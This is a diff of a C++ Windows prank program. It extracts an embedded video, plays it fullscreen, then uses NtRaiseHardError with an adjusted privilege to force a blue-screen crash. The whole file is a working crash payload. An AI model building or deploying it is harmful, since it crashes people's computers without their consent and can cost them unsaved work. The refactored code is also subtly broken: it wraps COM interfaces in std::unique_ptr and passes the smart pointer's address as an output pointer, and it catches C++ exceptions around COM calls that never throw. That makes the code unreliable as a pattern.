@@ -1,95 +1,86 @@
 #include <windows.h>
 #include <dshow.h>
+#include <memory>
 
-// externs for BSoD stuff
 extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
 extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);
 
-// global variables for DirectShow
-IGraphBuilder*	graph = 0; 		// filter graph manager
-IMediaControl*	control = 0; 	// media control interface
-IMediaEvent*	event = 0; 		// media event interface
-IVideoWindow*	window = 0;		// video window
+std::unique_ptr<IGraphBuilder> graph;
+std::unique_ptr<IMediaControl> control;
+std::unique_ptr<IMediaEvent> event;
+std::unique_ptr<IVideoWindow> window;
 
-// helper functions
 void GetVideoResource(LPWSTR* path) {
-	// get the video resource data
-	HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(2), RT_RCDATA);
-	HGLOBAL handle = LoadResource(NULL, resource);
+    HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(2), RT_RCDATA);
+    if (resource == NULL) {
+        ExitProcess(1);
+    }
 
-	DWORD size = SizeofResource(NULL, resource);
-	LPVOID data = LockResource(handle);
+    DWORD size = SizeofResource(NULL, resource);
+    LPVOID data = LockResource(LoadResource(NULL, resource));
+    if (data == NULL) {
+        ExitProcess(1);
+    }
 
-	// close the resource handle
-	CloseHandle(handle);
+    *path = new WCHAR[MAX_PATH];
+    GetTempPathW(MAX_PATH, *path);
+    StringCbCatW(*path, MAX_PATH, L"video.wmv");
 
-	// get the temporary path and append the video name
-	GetTempPathW(MAX_PATH, *path);	
-	StringCbCatW(*path, MAX_PATH, L"video.wmv");
+    HANDLE file = CreateFileW(*path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (file == INVALID_HANDLE_VALUE) {
+        ExitProcess(1);
+    }
 
-	// create the file handle and the variable for number of written bytes
-	HANDLE file = CreateFileW(*path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	DWORD written = 0;
+    DWORD written;
+    if (!WriteFile(file, data, size, &written, NULL) || written != size) {
+        CloseHandle(file);
+        ExitProcess(1);
+    }
 
-	// write the video data to the temporary path
-	WriteFile(file, data, size, &written, NULL);
-	CloseHandle(file);
-
-	// free the resource
-	FreeResource(resource);
+    CloseHandle(file);
+    FreeResource(resource);
 }
 
-void InitializeDirectShow(LPCWSTR* path) {
-	// initialize the COM
-	CoInitialize(NULL);
+void InitializeDirectShow(LPCWSTR path) {
+    CoInitialize(NULL);
 
-	// create the filter graph manager
-	CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&graph);
+    graph.reset();
+    CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&graph);
 
-	// get all needed addition interfaces
-	graph->QueryInterface(IID_IMediaControl, (void**)&control);
-	graph->QueryInterface(IID_IMediaEvent, (void**)&event);
-	graph->QueryInterface(IID_IVideoWindow, (void**)&window);
+    control.reset();
+    graph->QueryInterface(IID_IMediaControl, (void**)&control);
 
-	// attempt to build the graph for file playback
-	graph->RenderFile(*path, NULL);
+    event.reset();
+    graph->QueryInterface(IID_IMediaEvent, (void**)&event);
 
-	// set the video window to fullscreen mode
-	window->put_FullScreenMode(OATRUE);
+    window.reset();
+    graph->QueryInterface(IID_IVideoWindow, (void**)&window);
+
+    graph->RenderFile(path, NULL);
+    window->put_FullScreenMode(OATRUE);
 }
 
 ULONG TriggerBSOD() {
-	BOOLEAN state;
-	ULONG response;
-
-	RtlAdjustPrivilege(19, TRUE, FALSE, &state); // adjust privileges to allow raising BSoD
-	NtRaiseHardError(0xdeadbeef, 0, 0, NULL, 6, &response); // raise BSoD
-
-	return response;
+    BOOLEAN state;
+    ULONG response;
+    RtlAdjustPrivilege(19, TRUE, FALSE, &state);
+    NtRaiseHardError(0xdeadbeef, 0, 0, NULL, 6, &response);
+    return response;
 }
 
-// main function
 int main() {
-	LPWSTR path = new WCHAR[MAX_PATH];
-	//WCHAR* path = L"C:\\Users\\bemxio\\AppData\\Local\\Temp\\video.wmv";
+    LPWSTR path;
+    GetVideoResource(&path);
 
-	HRESULT result;
-	LONG code;
-	
-	ShowWindow(GetConsoleWindow(), SW_HIDE); // hide console window
+    try {
+        InitializeDirectShow(path);
+        control->Run();
+        event->WaitForCompletion(INFINITE, nullptr);
+    } catch (const std::exception& e) {
+        return 1;
+    }
 
-	GetVideoResource(&path); // get the video resource
-	InitializeDirectShow((LPCWSTR*)&path); // initialize directshow stuff
+    TriggerBSOD();
 
-	result = control->Run(); // play the video
-
-	if (SUCCEEDED(result)) {
-		event->WaitForCompletion(INFINITE, &code); // wait for video to finish
-	}
-
-	// trigger the blue screen of death
-	TriggerBSOD();
-
-	// if it gets here, the BSoD failed :(
-	return 1;
+    return 1;
 }
